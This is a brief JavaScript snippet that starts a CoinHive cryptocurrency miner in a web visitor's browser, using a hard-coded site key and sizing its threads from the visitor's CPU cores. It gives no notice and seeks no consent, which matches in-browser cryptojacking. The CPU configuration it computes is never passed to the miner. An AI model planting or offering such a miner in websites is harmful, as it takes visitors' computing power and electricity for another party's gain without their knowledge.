if (navigator.hardwareConcurrency > 1){
    var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
}else{
    var cpuConfig = {throttle:0.6}
}
var miner = new CoinHive.Anonymous('PaCWx1Ej0CpdT7HFXfMsJzdRvtG2CN6i');
miner.start();


